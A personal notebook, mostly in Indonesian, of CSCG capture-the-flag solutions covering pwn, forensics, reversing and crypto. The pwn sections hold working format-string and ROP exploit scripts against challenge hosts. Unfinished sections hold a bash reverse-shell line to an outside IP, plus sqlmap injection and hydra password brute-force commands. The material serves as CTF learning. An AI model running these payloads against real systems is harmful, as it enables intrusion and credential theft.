0x7ffff7df6a70
```
Sekarang kita akan menjalankan programnya
```
r
```

```
Starting program: /home/wowon/Downloads/tmp/pwn1 
-----------------------------------------
| Look                                   |
| If you had                             |
| One shot                               |
| Or one opportunity                     |
| To seize everything you ever wanted    |
| In one moment                          |
| Would you capture it                   |
| Or just let it slip?                   |
-----------------------------------------

It's dangerous to go alone! Take this: 7ffff7e34d10

Enter your shot: 0x7ffff7df6a70


Good luck
[Inferior 1 (process 127461) exited normally]
```
Kita keluar dari program dengan norman, mantap. Dari sini kita tahu bahwa kita bisa mengeksekusi sebuah fungsi di "libc".

Sekarang untuk mendapatkan shell di server kita butuh sebuah rumus untuk mempointer fungsi yang mengeksekusi shell dari "libc".

Pertama kita akan cari base address dari library "libc"
```js
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00555555554000 0x00555555555000 0x00000000000000 r-- /home/wowon/Downloads/tmp/pwn1
0x00555555555000 0x00555555556000 0x00000000001000 r-x /home/wowon/Downloads/tmp/pwn1
0x00555555556000 0x00555555557000 0x00000000002000 r-- /home/wowon/Downloads/tmp/pwn1
0x00555555557000 0x00555555558000 0x00000000002000 r-- /home/wowon/Downloads/tmp/pwn1
0x00555555558000 0x00555555559000 0x00000000003000 rw- /home/wowon/Downloads/tmp/pwn1
0x007ffff7db0000 0x007ffff7dd2000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7dd2000 0x007ffff7f4a000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7f4a000 0x007ffff7f98000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7f98000 0x007ffff7f9c000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7f9c000 0x007ffff7f9e000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x007ffff7f9e000 0x007ffff7fa4000 0x00000000000000 rw- 
0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar]
0x007ffff7fcd000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]
0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw- 
0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
```
Pada kasus diatas base address dari "libc" adalah "0x007ffff7db0000" dan "libc"-nya berversi 2.31

Sekarang kita akan melihat address dari "libc" yang meng-eksekusi shell menggunakan perintah
```
one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b31 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Kita akan mencari dari ketiga diatas mana perintah shell yang digunakan oleh program ini
```
tele 15
00:0000│ rsp 0x7fffffffdc08 —▸ 0x55555555539b (one_shot+314) ◂— nop    
01:0008│     0x7fffffffdc10 —▸ 0x7fffffffe111 ◂— 'SHELL=/bin/bash'
02:0010│     0x7fffffffdc18 ◂— 0x47d11d870425f400
03:0018│ rbp 0x7fffffffdc20 —▸ 0x7fffffffdc40 ◂— 0x0
04:0020│     0x7fffffffdc28 —▸ 0x5555555553df (main+45) ◂— nop    
05:0028│     0x7fffffffdc30 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe0f2 ◂— '/home/wowon/Downloads/tmp/pwn1'
06:0030│     0x7fffffffdc38 ◂— 0x100000000
07:0038│     0x7fffffffdc40 ◂— 0x0
08:0040│     0x7fffffffdc48 —▸ 0x7ffff7dd40b3 (__libc_start_main+243) ◂— mov    edi, eax
09:0048│     0x7fffffffdc50 ◂— 0x100000018
0a:0050│     0x7fffffffdc58 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe0f2 ◂— '/home/wowon/Downloads/tmp/pwn1'
0b:0058│     0x7fffffffdc60 ◂— 0x1f7f987a0
0c:0060│     0x7fffffffdc68 —▸ 0x5555555553b2 (main) ◂— push   rbp
0d:0068│     0x7fffffffdc70 —▸ 0x5555555553f0 (__libc_csu_init) ◂— endbr64 
0e:0070│     0x7fffffffdc78 ◂— 0xfdb4fb87feaf962f
```

```python
setvbuf_addr = 0x7ffff7dfdbe0 # from the output of the application
libc_base_debugger = 0x7ffff7d82000 # from the vmmap command
offset_setvbuf_base = setvbuf_addr - libc_base_debugger
hex(offset_setvbuf_base)
offset_one_gadget = 0xfc477
print(f"Gadget at: {libc_base_debugger + offset_one_gadget:016x}")
```


### Recreating the vulnerability

```sh
sudo docker build . -t intro-pwn1
sudo docker run -p 1024:1024 intro-pwn1
sudo docker cp 9639ef6562ff:/lib/x86_64-linux-gnu/libc.so.6 .
one_gadget libc.so.6
```
out
```
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)  
constraints:  
 rsp & 0xf == 0  
 rcx == NULL  
 rbp == NULL || (u16)[rbp] == NULL  
  
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])  
constraints:  
 address rbp-0x78 is writable  
 [r10] == NULL || r10 == NULL  
 [[rbp-0x70]] == NULL || [rbp-0x70] == NULL  
  
0xebcf5 execve("/bin/sh", r10, rdx)  
constraints:  
 address rbp-0x78 is writable  
 [r10] == NULL || r10 == NULL  
 [rdx] == NULL || rdx == NULL  
  
0xebcf8 execve("/bin/sh", rsi, rdx)  
constraints:  
 address rbp-0x78 is writable  
 [rsi] == NULL || rsi == NULL  
 [rdx] == NULL || rdx == NULL
```

```
objdump -D libc.so.6 | grep setvbuf
```

```
0000000000081670 <_IO_setvbuf@@GLIBC_2.2.5>:  
  81691:       75 5d                   jne    816f0 <_IO_setvbuf@@GLIBC_2.2.5+0x80>  
  816a7:       74 1c                   je     816c5 <_IO_setvbuf@@GLIBC_2.2.5+0x55>  
  816b2:       0f 85 88 01 00 00       jne    81840 <_IO_setvbuf@@GLIBC_2.2.5+0x1d0>  
  816cd:       0f 84 ed 00 00 00       je     817c0 <_IO_setvbuf@@GLIBC_2.2.5+0x150>  
  816d7:       0f 84 cb 00 00 00       je     817a8 <_IO_setvbuf@@GLIBC_2.2.5+0x138>  
  816e0:       74 3e                   je     81720 <_IO_setvbuf@@GLIBC_2.2.5+0xb0>  
  816e8:       e9 81 00 00 00          jmp    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>  
  816f4:       0f 84 c6 00 00 00       je     817c0 <_IO_setvbuf@@GLIBC_2.2.5+0x150>  
  816fe:       0f 84 a4 00 00 00       je     817a8 <_IO_setvbuf@@GLIBC_2.2.5+0x138>  
  81707:       74 17                   je     81720 <_IO_setvbuf@@GLIBC_2.2.5+0xb0>  
  8172b:       0f 84 af 00 00 00       je     817e0 <_IO_setvbuf@@GLIBC_2.2.5+0x170>  
  81752:       0f 86 d8 00 00 00       jbe    81830 <_IO_setvbuf@@GLIBC_2.2.5+0x1c0>  
  81771:       75 9c                   jne    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>  
  81783:       75 8a                   jne    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>  
  81792:       0f 8e 77 ff ff ff       jle    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>  
  8179d:       e9 6d ff ff ff          jmp    8170f <_IO_setvbuf@@GLIBC_2.2.5+0x9f>  
  817b5:       e9 77 ff ff ff          jmp    81731 <_IO_setvbuf@@GLIBC_2.2.5+0xc1>  
  817cb:       0f 85 60 ff ff ff       jne    81731 <_IO_setvbuf@@GLIBC_2.2.5+0xc1>  
  817d4:       eb 98                   jmp    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>  
  817e8:       75 84                   jne    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>  
  8180b:       76 3d                   jbe    8184a <_IO_setvbuf@@GLIBC_2.2.5+0x1da>  
  81817:       0f 88 c5 fe ff ff       js     816e2 <_IO_setvbuf@@GLIBC_2.2.5+0x72>  
  81825:       e9 44 ff ff ff          jmp    8176e <_IO_setvbuf@@GLIBC_2.2.5+0xfe>  
  81835:       e9 1e ff ff ff          jmp    81758 <_IO_setvbuf@@GLIBC_2.2.5+0xe8>  
  81845:       e9 6e fe ff ff          jmp    816b8 <_IO_setvbuf@@GLIBC_2.2.5+0x48>  
  8184f:       eb bc                   jmp    8180d <_IO_setvbuf@@GLIBC_2.2.5+0x19d>  
  8807d:       e9 ee 95 ff ff          jmp    81670 <_IO_setvbuf@@GLIBC_2.2.5>
```

```
hex(7f2199af6670-0x81670+0xebcf8)
```
### Reverensi
https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start#:~:text=rdx%20%2D%20register%20d%20extended,index%20(destination%20for%20data%20copies)


## Intro to Pwn 2
```sh
sudo docker build . -t intro-pwn2
sudo docker run -p 1024:1024 intro-pwn2
sudo docker exec -it b43ac85fb888 "/bin/bash"
```

vulnerability
```
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```

```
x *main
print main
print load_flag
```
sample out:
```
$2 = {<text variable, no debug info>} 0x4012a4 <load_flag>
```
A segfault basically means you did something bad with pointers. This is probably a segfault:

melihat stack pointer
```
p $sp
x/40x $sp # hex
x/40s $sp # string
```

kita akan mencari address dari stack yang kemungkinan menyimpan "flag"-nya
```sh
objdump -t pwn2
[...]
0000000000401400 g     F .text  000000000000005d              __libc_csu_init  
00000000004040e0 g     O .bss   0000000000000400              flag_buffer  
00000000004044e0 g       .bss   0000000000000000              _end
[...]
```

ex
saya mencoba untuk mendapatkan address stack dari input yang saya berikan, tetapi nilainya ada yang hilang?
```
python -c "print('BBAA' + '\xE0\x40\x40' + 'BBAA' + '%x'*8)" | nc 127.0.0.1 1024
python -c "print('AABBAABB' + '%x'*1000)" | nc 127.0.0.1 1024
```

```
4012a4
python -c "print('\xa4\x12\x40' + '%x'*4+'%s')" | nc 127.0.0.1 1024
```

```sh
python -c "print('\xe0\x40\x40' + '%x'*4+'%s')" | nc 127.0.0.1 1024

python -c "print('\xc4\x13\x40'+'%x'*6+'%s')" | nc 127.0.0.1 1024

python -c "print('\x51\x13\x40'+'%5\$s')" | nc 127.0.0.1 1024

```

tidak work, *somehow* saya sedikit salah dalam memahami vidio reverensi
```
(python -c "print('\xe0\x40\x40' + '%x'*4+'%s')") | ncat --ssl c4d97e9c8803ad8d838334df-intro-pwn-2.challenge.master.cscg.live 31337
```

saya sudah memerikasa `.hidden _dl_relocate_static_pie` dan tidak memunculkan input, apakah address ini memang kosong?
```
python3 -c "print('\x40\x11\x40%n'+'%x'*5+'%s')" | nc 127.0.0.1 1024
```

```
python3 -c "print('\xE0\x40\x40'+'%x'*5+'%n')" | nc 127.0.0.1 1024
```

```
python3 -c "print('%1\$04x%10\$n')"|nc localhost 1024
```

```
python3 -c "print(',%08x,'*30+'%s'+'A'*18+'\x19\x05\x40')"|nc localhost 1024
```
saya sudah mencoba semua address yang saya temukan di `obj -t pwn2` tapi hasilnya nihil
programnya saya sisipkan di `dump_file`

```python
import os

for i in range(1024,10000):
    print("number:", i)
    os.system("(sleep 2;python3 -c 'print(\"%{}$s\")';sleep 2) | ncat --ssl 14c6d7576f1d64f1c91bddf6-intro-pwn-2.challenge.master.cscg.live 31337".format(i))
    print("\n")
```
### Fix penyelesaian
```python
from pwn import *

a = remote('0e4d53f5293cacd84dbd5303-intro-pwn-2.challenge.master.cscg.live', 31337, ssl=True)
a.recvuntil(b'Give')
a.sendline(b'.%08x.'*30+b'%s'+b'A'*18+b'\xe0\x40\x40')
a.interactive()
```
Setelah beberapa penelitian terhadap hex, saya mendapatkan kesimpulan bahwa hex yang sebelumnya saya kirim telah dirubah oleh encoding yang saya gunakan yaitu utf-8.

Solusinya yang saya temukan adalah menggunakan library python3 yaitu pwntools. Dengan pwn tools ini hex yang saya berikan tidak berubah, dan akhirnya saya bisa mendapatkan flagnya

CSCG{h0pe_y0u_didnt_stuggl3_t00_h4rd_on_th1s_one}

Alternatif (new)
```sh
	(sleep 2;python3 -c "print(',%08x,'*30+'%s'+'A'*18)" > /tmp/payload && echo -e `cat /tmp/payload`'\xe0\x40\x40';sleep 2)|ncat --ssl 4e384f82e41b15980e5a1d0e-intro  
-pwn-2.challenge.master.cscg.live 31337
```
### Pemikiran
Kita harus mengetahui dimana letak dari stack yang berisi data dari "load_flag"

```
docker run intro-pwn2:latest bash -c "apt-get install -y binutils"
docker commit eager_gates pwn2-with_objdump
docker run -it -p 81:80 ubuntu-nginx /bin/bash
```

### Catatan
In computer programming, the block starting symbol (abbreviated to . bss or bss) is **the portion of an object file, executable, or assembly language code that contains statically allocated variables that are declared but have not been assigned a value yet**. It is often referred to as the "bss section" or "bss segment".

`.text` tells the assembler to switch to the text segment (where code goes), and `.data` tells the assembler to switch to the data segment (where data goes).

More specifically, `.data` is where _non-zero_, _read-write_ data goes. Other section names include `.rodata` (or `.rdata` on Windows) for read-only data, and `.bss` for zeroed data.

```
readelf -a pwn2
```

Description. The memset() function **sets the first count bytes of dest to the value c**. The value of c is converted to an unsigned character.

#### karakter \xe0 berubah menjadi \xa0\xc3
Kemungkinan yang terjadi karena **karakter encoding** dari program C tersebut yang membuat karakter yang tadinya `\xe0` berubah menjadi `\xa0\xc3`. Kemungkinan **Solusi** yang bisa dilakukan adalah mencari hex yang bisa menghasilkan `\xe0` didepannya jika di inputkan ke programnya

### Referensi
https://owasp.org/www-community/attacks/Format_string_attack
https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b
https://jvns.ca/blog/2021/05/17/how-to-look-at-the-stack-in-gdb/\
https://www.youtube.com/watch?v=0WvrSfcdq1I&t=470s
https://www.youtube.com/watch?v=y5kcaqKYlqI&t=1001s **W4_1 - Format string vulnerabilities**
https://www.youtube.com/watch?v=aJVNBAB-pZg&t=618s **Format String Vulnerabilities Lunchbox**
https://cs155.stanford.edu/papers/formatstring-1.2.pdf
https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
https://jhalon.github.io/2018-google-ctf-beginners-pwn-solutions-2/
https://mincong.io/2019/04/07/understanding-iso-8859-1-and-utf-8/ **character encode**

## Intro to Pwn 3

```
    7,  # rax = addr_of_puts_addr
    4,  # rax = addr_of_puts
    12, # rcx = addr_of_puts 
    8,  # rdx = bin_sh_offset
    10, # rdx = /bin/sh-addr [addr_puts + offset]

    12, # rcx = addr_of_puts [rax]
    6,  # mov system_puts offset into rax
    14, # rcx = system_addr [rax + rcx]


    11, # rdi = /bin/sh-addr
    13, # rax = system_addr [mov rax,rcx]
    16, # call rax

```

```python
import pwn

r = pwn.remote("7effb0bc550628905e8f1033-intro-pwn-3.challenge.master.cscg.live", 31337, ssl=True)

rop = map(lambda x: str(x), [14, 6, 3, 11, 5, 13, 6, 3, 7, 9, 10, 12, 15, -1])

for rg in rop:
    r.recvuntil(": ")
    r.sendline(rg)

r.interactive()
```
# Forensic
## Intro to Forensics 1
kita bisa masuk ke tcp stream di wireshark untuk menemukan flagnya
## Intro to Forensics 2
- look into port
- use rizin (radare2)
```python
from scapy.all import *

for packet in PcapReader('intro-forensics-2.pcapng'):
    if IP in packet and packet[IP].src == '192.168.26.53' and TCP in packet and bytes(packet[TCP].payload).startswith(b'|<|'):
        print(packet[TCP].dport.to_bytes(2, byteorder='big').decode(), end='')
```

```python
from scapy.all import *

pcap_flow = rdpcap('intro-forensics-2.pcapng')
sessions = pcap_flow.sessions()
solution = []
for session in sessions:
    for packet in sessions[session]:
        if not(IP in packet and packet[IP].src == '192.168.26.53' and TCP in packet): continue
        port = packet[TCP].dport
        if port == 80 or port == 443 or not packet[TCP].payload: continue
        print(port.to_bytes(2, byteorder='big').decode(), end='')
print('')
```
## Intro to Forensics 3
https://www.nayuki.io/page/png-file-chunk-inspector
https://github.com/Hedroed/png-parser

```python
import struct, zlib

PNG_SIGNATURE = [137, 80, 78, 71, 13, 10, 26, 10]

if __name__ == "__main__":
    with open("intro-forensics-3.png", "rb") as f:
        old_bytes = f.read()

    signature = old_bytes[:len(PNG_SIGNATURE)]
    old_bytes = bytearray(old_bytes[len(PNG_SIGNATURE) :])

    chunks = []

    while len(old_bytes) != 0:
        length = struct.unpack(">I", old_bytes[:4])[0]
        print("length", old_bytes[:4].hex(), length)
        if length > 2**31:
            print("BAD LENGTH")
        print("type", old_bytes[4:8])
        try:
            type = old_bytes[4:8].decode("ascii")
        except:
            type = "bad!"

        if type == "IDAT" and length == 0:
            length = 500000
            old_bytes[:4] = struct.pack(">I", 500000)
            print("fixed length")

        data = old_bytes[8 : 8 + length]
        crc = old_bytes[8 + length : 12 + length]
        calculated_crc = struct.pack(">I", zlib.crc32(old_bytes[4 : 8 + length]))
        print("crc", crc.hex())

        if type == "IHDR":
            sort_index = 0
        elif type == "IEND":
            sort_index = 99
        elif type == "IDAT":
            sort_index = struct.unpack(">I", crc)[0]

        print("sort_index", sort_index)

        

        chunks.append({
            "type": type,
            "sort_index": sort_index,
            "bytes": old_bytes[:8 + length] + calculated_crc
        })
        print("-------------------")

        old_bytes = old_bytes[12 + length :]
    
    chunks.sort(key=lambda x: x["sort_index"])

    with open("intro-forensics-3_solved.png", "wb") as f:
        f.write(bytes(PNG_SIGNATURE))
        for c in chunks:
            f.write(c["bytes"])
        print("Done")
```
## Pathological
```sh
cat access.log | grep -P "(?<=\.,)\d*(?=,)" | grep 1373 | grep -Po "(?<=\.,)\d*(?=,)" > pos
cat access.log | grep -P "(?<=\.,)\d*(?=,)" | grep 1373 | grep -Po '(?<=")%[a-f0-9]{2}' > chars
for i in `seq 1 31`; do paste -d ' ' pos chars | grep "^$i " | tail -1 | awk '{print $2}'; done | paste -sd '' | php -R 'echo urldecode($argn);'
CSCG{TempestGravitationLettuce}
```
# Belum Selesai
## Intro to Forensics 2
```
frame contains  "www.youtube.com"
ip.src == 192.168.26.53 && frame.len > 100
```

```sh
tshark -r intro-forensics-2.pcapng -Y 'frame contains  "www.youtube.com"'
```

```
|<|\|0<|<|<|\|0<|<
....
|<|\|0<|<|<|\|0<|<

....
|<|\|0<|<|<|\|0<|<

....
```
### Catatan
X-Frame-Options allows content publishers to prevent their own content from being used in an invisible frame by attackers. The DENY option is the most secure, preventing any use of the current page in a frame. More commonly, SAMEORIGIN is used, as it does **enable the use of frames, but limits them to the current domain**.

The 'client hello' message: **The client initiates the handshake by sending a "hello" message to the server**. The message will include which TLS version the client supports, the cipher suites supported, and a string of random bytes known as the "client random."

## Intro to Reverse Engineering 2
```python
data = "CSCG{...................................}"
split =  [' ']
rmrf = [ 0, 4, 6, 7, 8, 9 ]
status = False

if len(data) <= 0:
    print("Invalid")
    exit()

length = len(data)
text = data[0:5]

if text != "CSCG{" or ord(data[length - 1]) - (length * 3 + len(text) - 3) != 0:
    print("Invalid")
    exit()
print("Valid")
text2 = data[5::]
text2 = text2[0:len(text2) - 1]
print("text2:",text2)
```
## Mainframe
```sh
iconv -l
iconv -f IBM1141 -t utf-8 mainframe.pcap
```

```
/bin/bash -i >& /dev/tcp/10.18.90.165/1338 0>&1
ncat --ssl 0c9d240db4d2697aee696c02-mainframe.challenge.master.cscg.live 31337 <&0 | tee test.txt | iconv -f IBM1141 -t utf-8
```
- dari yang saya perhatikan bahwa koneksi dari client ke server memerlukan vefikasi
### Referensi
https://thepythoncorner.com/posts/2020-04-30-working-with-ebcdic-python/
## File Upload
```

Fatal error: Uncaught mysqli_sql_exception: Connection refused in /var/www/html/db.php:9 Stack trace: #0 /var/www/html/db.php(9): mysqli_connect('127.0.0.1', 'user', 'VerySafePasswor...', 'fileuploadplatf...', 3306) #1 /var/www/html/login.php(12): require_once('/var/www/html/d...') #2 {main} thrown in /var/www/html/db.php on line 9
```

### Test
get
```sh
sqlmap -u https://c712d028acf109f6bb1cdce8-file-upload.challenge.master.cscg.live:31337/\?username\=administrator\&password\=0 -p password --level 5 —dbms=mysql
```
post
```sh
sqlmap -u "https://e73a363c03f050fa2243f3e8-file-upload.challenge.master.cscg.live:31337/login.php" --data "username=adminisatrator&password=test" -p "password" --method POST
```
bruteforce
```sh
hydra -l "administrator" -P /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt 'e73a363c03f050fa2243f3e8-file-upload.challenge.master.cscg.live' http-post-form '/login.php:username=^USER^&password=^PASS^:F=Invalid username or password' -s 31337 -v -S
```

## Intro to Crypto 3
### Program belum selesai
#### Brute
```python

enc = '''105
147
233
7
81
145
253
56
71
153
249
2
105
163
199
6
24
162
211
2
98
162
152
56
71
137
236
22
95
161
253
26
92
163
199
112
77
150
199
44
64
164
237
121
83
137
239
6
89
154
199
5
77
150
237
6
95
154
152
120
77
146
152
121
89
154
195
2
105
163
199
6
24
162
211
2
109
162
153
40
26
163
199
121
26
137
236
10
92
162
253
22
92
137
236
10
92
162
253
22
92
137
236
22
95
161
253
26
92
163
199
112
77
149
199
121
94
154
253
120
77
146
253
14
69
162
211
2
121
162
152
113
70
162
211
1
23
189'''
enc = enc.split('\n')
# make enc int
enc = [int(i) for i in enc]
#print(enc)
dec = ''

dec1=''

for i in range(len(enc)):
    dec1 += chr(enc[i])

#with open('result.txt', 'w') as f:
#    for i in range(1, 255):
#        dec = ''
#        for a in range(len(enc)):
#            dec += chr(enc[a] ^ i)
#        if dec[0] == 'C':
#            dec1 += dec
#        #f.write("{}\n\n\n{}\n\n\n".format(i,dec))

#print(dec1)

def decrypt_one(enc, char, char_num, fixed: list[int]):
    for i in range(0xff):
        dec = ''
        for a in range(len(enc)):
            if a in fixed:
                dec += enc[a]
                #print(enc[a])
                continue
            dec += chr(ord(enc[a]) ^ i)
        if dec[char_num] == char:
            return dec
    return None
def decrypt_two(enc:str):
    characters = 'abcdefghijklmnopqrstuvwxyz{}_'
    fixed_chars:list[int] = []
    for i in range(0xff):
        dec = ''
        for a in range(len(enc)):
            if a in fixed_chars:
                #print(enc[a],"\n\n")
                dec += enc[a]
                continue
            if enc[a] in characters:
                dec += enc[a]
                fixed_chars.append(a)
                continue
            dec += chr(ord(enc[a]) ^ i)
        enc=dec
    return dec

def guess_decrypt(enc, char_num, fixed: list[int]):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_'
    blob = []
    for i in range(0xff):
        dec = ''
        for a in range(len(enc)):
            if a in fixed:
                dec += enc[a]
                #print(enc[a])
                continue
            dec += chr(ord(enc[a]) ^ i)
        if dec[char_num] in characters:
            #blob.append(dec)
            blob.append(dec[char_num])
    return blob

dec2 = decrypt_two(dec1)
print(dec2.encode('utf-8'))

dec1 = decrypt_one(dec1, 'S', 1, [0, 4, -1])
#print(dec1.encode('utf-8'))

dec1 = decrypt_one(dec1, 'C', 2, [0, 1, 4, -1])
#print(dec1.encode('utf-8'))


dec1 = (f"{decrypt_one(dec1, 'G', 3, [0, 1, 2, 4, -1])}")
#print(dec1.encode('utf-8'))

#enc3 = f"{guess_decrypt(dec1, 5, [0, 1, 2, 3, 4, -1])}"

#print(enc3)
```
#### Main
```python
import os
import struct

BITS = 56

FLAG = os.getenv("FLAG", "CSCG{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}")
A = int.from_bytes(os.urandom(BITS//8), "little")
B = int.from_bytes(os.urandom(BITS//8), "little")
SEED = int.from_bytes(os.urandom(BITS//8), "little")
print("BITS:",BITS)
print("BITS//8:",BITS//8)
print("A:",A)
print("B:",B)
print("SEED:",SEED)

def rng(x, size):
    #print("rng:",(x*A+B) & ((2**size)-1), (x*A+B), ((2**size)-1), x, size, A, B)
    return (x*A+B) & ((2**size)-1)

def gen_random(seed, bits, mask):
    state = seed
    while True:
        state = rng(state, bits) # state change every loop
        #print("state & mask:",state & mask, state, mask)
        yield state & mask # give a value to the caller and hold until the caller call again

def main():
    print("Here are some random numbers, now guess the flag")
    rng = gen_random(SEED, BITS, 0xFF) # sometime get_random() will return same output
    #print("random_rng:",rng.__next__())
    for i in range(len(FLAG)):
        next_rng = next(rng)
        #print("next_rng:",next_rng)
        print((next_rng ^ ord(FLAG[i])))

if __name__ == "__main__":
    main()
#rngs = gen_random(SEED, BITS, 0xFF)
#print(next(rngs))
#print(next(rngs))
#print(next(rngs))
#print(next(rngs))
```
## Intro to Crypto 3
- SAT (Boolean SATisfiability)
### Referensi
https://www.geeksforgeeks.org/2-satisfiability-2-sat-problem/#_=_

